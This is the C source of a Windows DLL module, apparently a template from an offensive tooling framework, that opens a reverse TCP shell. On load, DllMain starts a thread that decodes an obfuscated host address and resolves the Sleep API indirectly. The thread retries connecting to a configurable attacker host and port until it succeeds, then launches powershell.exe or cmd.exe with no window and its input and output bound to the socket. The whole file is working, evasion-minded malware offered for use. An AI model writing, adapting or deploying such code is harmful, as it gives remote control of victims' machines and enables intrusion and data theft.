#!name##PongDll
#!itemType##module
#!info##DLL file. Once loaded, it attempts to connect to the host until successful. Then it runs a reverse TCP shell with the selected program.
#!fileType##dll
#!hiveType##dll
#!lang##c
#!modProcess##BUILD_CODE##COMPILE
#!modCompiler##Basic-C
#!readyApp##True
#!compLib##lws2_32
#!reqMod##DuckTalesLib2
#!inFile##DuckTalesC_CORE_H##duck_core.h
#!inFile##DuckTalesC_CORE_C##duck_core.c
#!Var##PONG_ip##$IP_ADDR##Host ip address.##str
#!Var##PONG_port##4000##Host port number.##str
#!Var##PONG_shell##powershell.exe##The "Shell" program that will be launched. ex: 'cmd.exe', 'powershell.exe'##str



#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <winsock2.h>
#include "duck_core.h"


int pongV_SOCKET_AF_INET = 2;
int pongV_SOCKET_SOCK_STREAM = 1;
int pongV_SOCKET_IPPROTO_TCP = 6;
int pongV_PAUSE_CONN = 2;
int pongV_PAUSE_BUILD_SOCKET = 6;
char pong_COMMAND[] = "{{PONG_shell}}";

SOCKET pong_MAIN_SOCKET;

typedef void (__stdcall *aSleep)(dt_DWORD);
void *pong_addr_Sleep;


uint32_t pong_raw_ip_addr[] = {
    {{shTOOL.DigitsEncode2(PONG_ip, _DUCK_TBASE)}}
};
uint32_t pong_raw_sleep[] = {
    {{shTOOL.DigitsEncode2("Sleep", _DUCK_TBASE)}}
};
int pong_port = {{PONG_port}};
char pong_ip_addr[24];


void pongSleep(dt_DWORD time_sec) {
    pong_addr_Sleep = dt_DuckGetKAddr(pong_raw_sleep);
    aSleep pong_sleep = (aSleep)pong_addr_Sleep;
    pong_sleep(time_sec * 1000);
}

dt_BOOL pongInit(void) {
    WSADATA wsa;
    if (WSAStartup(0x0202, &wsa) != 0 ) {
        return 0;
    }
    const char *ip_addr = dt_DuckDecode(pong_raw_ip_addr);
    if (ip_addr == 0) {
        return 0;
    }
    strcpy(pong_ip_addr, ip_addr);
    return 1;
}

dt_BOOL pong_rawTryConnection(void) {
    pong_MAIN_SOCKET = WSASocketA(pongV_SOCKET_AF_INET, pongV_SOCKET_SOCK_STREAM, pongV_SOCKET_IPPROTO_TCP, 0, 0, 0);
    if (pong_MAIN_SOCKET == -1) {
        return 0;
    }
    struct sockaddr_in sock_struct;
    sock_struct.sin_family = pongV_SOCKET_AF_INET;
    sock_struct.sin_addr.s_addr = inet_addr(pong_ip_addr);
    sock_struct.sin_port = htons(pong_port);
    CONNECT:
    int conn_result = connect(pong_MAIN_SOCKET,(const struct sockaddr*) &sock_struct, sizeof(sock_struct));
    if (conn_result == -1) {
        pongSleep(pongV_PAUSE_CONN);
        goto CONNECT;
    }
    else {
        return 1;
    }

}

dt_BOOL pong_TryConn(void) {
    while (1) {
        if (pong_rawTryConnection() == 1) {
            break;
        }
        pongSleep(pongV_PAUSE_BUILD_SOCKET);
    }
    return 1;
}

dt_BOOL pongStartShell(void) {
    if (pong_MAIN_SOCKET == INVALID_SOCKET) {
        return 0;
    }
    dts_PROCESS_INFORMATION pi;
    dts_STARTUPINFOA si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = 0x00000100;
    si.hStdError = (dt_HANDLE)pong_MAIN_SOCKET;
    si.hStdInput = (dt_HANDLE)pong_MAIN_SOCKET;
    si.hStdOutput = (dt_HANDLE)pong_MAIN_SOCKET;
    dt_BOOL cp_result = dtf_CreateProcessA(0, pong_COMMAND, 0, 0, 1, dtv_PROCESS_CREATE_NO_WINDOW, 0, 0, &si, &pi);
    if (cp_result == 0) {
        return 0;
    }
    return 1;
    
}

void pongSTART(void) {
    pongInit();
    pong_TryConn();
    if (pongStartShell() == 0) {
        closesocket(pong_MAIN_SOCKET);
        WSACleanup();
    }

}

void __stdcall duckEnter(dt_LPVOID args) {
    pongSTART();
}


dt_BOOL DllMain(dt_HMODULE hModule, dt_DWORD reason, dt_LPVOID reserved) {
    switch (reason) {
        case 1:
            dt_DuckBasicInit();
            dtf_CreateThread(0, 0, duckEnter, 0, 0, 0);
            break;
        case 2:
            break;
        case 3:
            break;
        case 4:
            break;
    }
    return 1;
}